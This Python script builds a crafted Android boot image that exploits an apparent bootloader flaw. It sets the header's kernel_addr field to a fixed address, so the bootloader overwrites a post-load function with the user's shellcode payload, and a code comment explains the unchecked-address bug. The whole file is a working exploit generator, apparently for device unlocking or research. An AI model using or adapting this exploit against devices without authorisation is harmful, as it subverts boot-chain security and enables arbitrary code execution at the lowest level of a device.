#!/usr/bin/env python3

import sys
import struct

from pathlib import Path

debug = True

page_size = 0x800
inject_addr = 0x460038C4

def dprint(*args, **kwargs):
    if debug:
        print(*args, **kwargs)

def align_page(size):
    return ((size + page_size - 1) // page_size) * page_size

def main():
    output = Path.cwd().parent / 'bin' / 'microloader.bin'
    payload_path = Path.cwd() / 'build' / 'payload.bin'

    if len(sys.argv) == 2:
        output = Path(sys.argv[1]).absolute()
    elif len(sys.argv) == 3:
        payload_path = Path(sys.argv[1]).absolute()
        output = Path(sys.argv[2]).absolute()

    with open(payload_path, 'rb') as f:
        shellcode = f.read()
    
    payload = shellcode
    payload_size = len(payload)
    
    dprint('Shellcode: %s (%d bytes)' % (payload_path, len(shellcode)))
    dprint('Total payload: %d bytes' % payload_size)
    dprint('Output: %s' % output)
    dprint('Stub address: 0x%08X' % inject_addr)

    # the exploit works because when loading a 32-bit kernel, the bootloader
    # directly uses the kernel_addr field as the destination address without
    # validation.
    # we exploit this by setting kernel_addr to point to a function that runs
    # after the boot image is loaded. The bootloader then  overwrites this
    # function with our payload, which is placed immediately after the header
    # where the kernel is expected to be.
    hdr = b'ANDROID!'                      # magic
    hdr += struct.pack('<I', payload_size) # kernel_size
    hdr += struct.pack('<I', inject_addr)  # kernel_addr
    hdr += struct.pack('<I', 0)            # ramdisk_size
    hdr += struct.pack('<I', 0)            # ramdisk_addr
    hdr += struct.pack('<I', 0)            # second_size
    hdr += struct.pack('<I', 0)            # second_addr
    hdr += struct.pack('<I', 0)            # tags_addr
    hdr += struct.pack('<I', page_size)    # page_size
    hdr += struct.pack('<I', 0)            # unused
    hdr += struct.pack('<I', 0)            # os_version
    hdr += b'\x00' * 16                    # name[16]
    
    cmdline = b'bootopt=64S3,32N2,32N2 buildvariant=user'
    hdr += cmdline                         # cmdline[512]
    hdr += b'\x00' * (512 - len(cmdline))
    hdr += b'\x00' * 32                    # id[8] (uint32_t)
    hdr += b'\x00' * 1024                  # extra_cmdline[1024]
    
    hdr += b'\x00' * (page_size - len(hdr))
    assert len(hdr) == page_size
    
    # align the payload to page boundary
    img = hdr + payload
    img += b'\x00' * (align_page(payload_size) - payload_size)
    
    total_size = len(img)
    dprint('Boot image size: %d bytes' % total_size)
    dprint('Header: %d bytes' % page_size)
    dprint('Payload section: %d bytes' % align_page(payload_size))
    
    with open(output, 'wb') as f:
        f.write(img)
    
    dprint('Written to %s' % output)

if __name__ == '__main__':
    main()